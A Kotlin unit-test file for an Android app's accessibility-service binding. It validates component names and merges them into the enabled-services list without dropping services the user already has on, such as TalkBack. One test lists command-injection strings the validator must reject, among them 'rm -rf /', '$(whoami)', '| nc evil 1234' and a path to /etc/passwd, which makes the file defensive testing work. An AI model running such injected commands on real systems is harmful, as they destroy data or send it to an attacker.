package cn.adcalm.guard.core

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * 无障碍绑定列表的合并逻辑。
 *
 * 这块最容易出的错不是"没写上"，而是**写上了但把别人的服务关了**——
 * 用户可能同时开着读屏软件。所以下面最重要的几条都是关于合并的：
 * 已有的条目必须原样保留。
 */
class AccessibilityBindingTest {

    private val ours = "cn.adcalm.guard/cn.adcalm.guard.service.AdCalmAccessibilityService"
    private val talkback = "com.google.android.marvin.talkback/.TalkBackService"

    // ---- 组件名校验 ----

    @Test
    fun `合法的组件名`() {
        assertTrue(AccessibilityBinding.isValidComponent(ours))
        assertTrue(AccessibilityBinding.isValidComponent(talkback))
    }

    @Test
    fun `组件名里的 shell 元字符一律拒绝`() {
        // 这个值最终会拼进 `settings put` 的命令行，放松一点就是命令注入。
        val attacks = listOf(
            "cn.adcalm.guard/x; rm -rf /",
            "cn.adcalm.guard/x\$(whoami)",
            "cn.adcalm.guard/x`id`",
            "cn.adcalm.guard/x | nc evil 1234",
            "cn.adcalm.guard/x'",
            "cn.adcalm.guard/x\"",
            "cn.adcalm.guard/x&&reboot",
            "../../etc/passwd",
            "cn.adcalm.guard",
            "/.Service",
            "",
        )
        for (attack in attacks) {
            assertFalse("应当拒绝：$attack", AccessibilityBinding.isValidComponent(attack))
        }
    }

    // ---- 读取 ----

    @Test
    fun `系统没设置过时返回的字面量 null 不算一个条目`() {
        // `settings get` 在值为空时返回字符串 "null"，把它当成组件名会写出脏数据。
        assertEquals(emptyList<String>(), AccessibilityBinding.entries("null"))
        assertEquals(emptyList<String>(), AccessibilityBinding.entries(null))
        assertEquals(emptyList<String>(), AccessibilityBinding.entries(""))
        assertEquals(emptyList<String>(), AccessibilityBinding.entries("::"))
    }

    @Test
    fun `能识别出列表里已包含本应用`() {
        assertTrue(AccessibilityBinding.contains("$talkback:$ours", ours))
        // 大小写不敏感：系统写回来的形式未必和我们的字面量完全一致
        assertTrue(AccessibilityBinding.contains(ours.uppercase(), ours))
        assertFalse(AccessibilityBinding.contains(talkback, ours))
        assertFalse(AccessibilityBinding.contains(null, ours))
    }

    // ---- 合并（这块是重点） ----

    @Test
    fun `空列表时写入本应用`() {
        assertEquals(ours, AccessibilityBinding.merge("null", ours))
        assertEquals(ours, AccessibilityBinding.merge(null, ours))
    }

    @Test
    fun `合并时保留用户已开启的其他无障碍服务`() {
        // 这是整个读—合并—写流程存在的理由。直接 `settings put` 覆盖的话，
        // 用户开着的读屏软件会被一起关掉——用一个静默失效换掉另一个。
        assertEquals(
            "$talkback:$ours",
            AccessibilityBinding.merge(talkback, ours),
        )
    }

    @Test
    fun `已经在列表里时不重复添加、也不改变原有顺序`() {
        val current = "$talkback:$ours"
        assertEquals(current, AccessibilityBinding.merge(current, ours))
    }

    @Test
    fun `组件名非法时返回 null，调用方必须放弃`() {
        assertNull(AccessibilityBinding.merge(talkback, "cn.adcalm.guard/x; rm -rf /"))
    }

    @Test
    fun `合并结果自身是干净的——每一项都过校验`() {
        val merged = AccessibilityBinding.merge("$talkback:null::", ours)!!
        for (part in merged.split(':')) {
            assertTrue("合并结果里出现了非法项：$part", AccessibilityBinding.isValidComponent(part))
        }
    }
}
